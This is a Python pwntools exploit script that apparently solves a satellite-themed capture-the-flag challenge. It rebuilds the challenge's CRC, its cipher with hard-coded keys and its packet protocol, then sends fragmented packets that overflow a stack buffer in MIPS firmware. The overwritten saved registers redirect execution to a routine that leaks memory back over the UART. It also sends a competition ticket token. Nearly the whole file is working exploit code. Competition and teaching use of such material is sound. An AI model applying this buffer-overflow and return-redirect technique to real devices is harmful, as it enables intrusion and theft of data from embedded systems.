#!/usr/bin/env python
import binascii
import subprocess
import sys
import time
from pwn import *

'''
https://gist.github.com/oysstu/68072c44c02879a2abf94ef350d1c7c6
'''
def crc16(data: bytes, poly=0x8408):
    '''
    CRC-16-CCITT Algorithm
    '''
    data = bytearray(data)
    crc = 0xFFFF
    for b in data:
        cur_byte = 0xFF & b
        for _ in range(0, 8):
            if (crc & 0x0001) ^ (cur_byte & 0x0001):
                crc = (crc >> 1) ^ poly
            else:
                crc >>= 1
            cur_byte >>= 1
    crc = (~crc & 0xFFFF)
    crc = (crc << 8) | ((crc >> 8) & 0xFF)
    
    return crc & 0xFFFF

block_size = 0xc0

# Change from the default block size (0x20) to the largest block size.
def change_block_size():
    data = struct.pack('<B', 0xc0)
    data = data.ljust(0x20 - 3, b'\0')
    return struct.pack('<BH', 0x79, crc16(data)) + data

def macpkt(data):
    assert len(data) <= block_size - 3

    data = data.ljust(block_size - 3, b'\0')
    return struct.pack('<BH', 0xe3, crc16(data)) + data

def encrypt_block(iv, key):
    iv0, iv1 = struct.unpack('<II', iv)
    key = struct.unpack('<IIII', key)

    uVar1 = 0x3e778b90
    while uVar1 != 0x7cef1720:
        uVar4 = (uVar1 + key[uVar1 & 3]) & 0xffffffff
        uVar1 = (uVar1 + 0x83e778b9) & 0xffffffff
        iv0 = iv0 + (uVar4 ^ (((iv1 << 4) ^ (iv1 >> 5)) + iv1));
        iv0 &= 0xffffffff
        iv1 = iv1 + ((uVar1 + key[(uVar1 >> 11) & 3]) ^ (((iv0 << 4) ^ (iv0 >> 5)) + iv0))
        iv1 &= 0xffffffff

    return struct.pack('<II', iv0, iv1)

def encrypt(data):
    global key, iv
    assert len(key) == 16 and len(iv) == 8

    data = data.ljust(block_size - 4, b'\0')

    buf = bytearray()
    for i in range(len(data)):
        if len(buf) % 8 == 0:
            iv = encrypt_block(iv, key)
        buf.append(data[i] ^ iv[i & 7])
    return buf

def rllpkt(seq, frag, data, eop=False):
    return macpkt(struct.pack('<B', 0x73) + encrypt(struct.pack('<H', (eop << 15) | (seq << 4) | frag) + data))

key = struct.pack('<IIII', 0x3036FE74, 0x7228B13D, 0x23A61BD8, 0x56503D60)
iv = struct.pack('<II', 0xA3BA2758, 0x020BEAFB) # cli -> srv
iv2 = struct.pack('<II', 0x265BD104, 0xB90DAB8B) # srv -> cli

r = remote('launchlink.satellitesabove.me', 5065)

# TODO use pwntools better... so ebeip90 doesn't tweet @me
r.readuntil('Ticket please:\n')
r.send(b'ticket{golf73159zulu:GF7xt3EcaJPk4k4nwTbj_OhN5CUx5VAvMQAJE_Lyw0Jn7ETPAren5WvwhIIwK3gYTA}\n')

time.sleep(1)

# increase the block size, necessary so we can send the next command
r.send(change_block_size())

time.sleep(1)

# "ephemeral" session key generated based on this data and randomly generated data
# since the server doesn't have a real RNG, we hard code the generated enc key above
r.send(macpkt(struct.pack('<BB', 0x17, 0x70) + b'1234'))

# we are overflowing the stack buffer in sub_BFC00604
# there are 0x508 bytes from the start of the buffer to the saved registers
'''
lw      $ra, 0x520+var_s24($sp)
lw      $fp, 0x520+var_s20($sp)
lw      $s7, 0x520+var_s1C($sp)
lw      $s6, 0x520+var_s18($sp)
lw      $s5, 0x520+var_s14($sp)
lw      $s4, 0x520+var_s10($sp)
lw      $s3, 0x520+var_sC($sp)
lw      $s2, 0x520+var_s8($sp)
lw      $s1, 0x520+var_s4($sp)
lw      $s0, 0x520+var_s0($sp)
jr      $ra
addiu   $sp, 0x548
'''

s0 = 0x42424242
s1 = 0x42424242
s2 = 0x42424242
s3 = 0x42424242
s4 = 0x42424242
s5 = 0x42424242
s6 = 0x42424242
s7 = 0x42424242
fp = 0x42424242
ra = 0x42424242

# if we return to loc_BFC084BC, then the data at $s0 + 5 will be copied into a
# heap buffer then transmitted back to us
# $s2 contains the copy size, $s4 the alloc size, $s1 the UART structure
payload = b'A' * 0x508
s4 = 0x90
s2 = 0x80
s1 = 0xa00ffd14
s0 = 0xa2008000 - 5
ra = 0xBFC084BC
payload += struct.pack('<IIIIIIIIII', s0, s1, s2, s3, s4, s5, s6, s7, fp, ra)
# we want to avoid halting the system, because it may take some time for the
# interrupt handler to finish sending the data, so infinite loop with: jr $ra
payload += b'A' * 0x2c + struct.pack('<I', 0xbfc006cc)

# send packets 1 - N (skipping packet 0)
# these get queued up and will be reassembled in order (according to the fragment id)
for x in range(16):
    data_size = block_size - 6
    data = payload[data_size * x:data_size * (x+1)]
    if len(data) > 0:
        r.send(rllpkt(0, x, data))
        time.sleep(0.5)
# this packet will trigger reassembly (and the bug) because EOP bit is set
r.send(rllpkt(0, 0, b'A' * (block_size - 6), 1))
r.interactive()
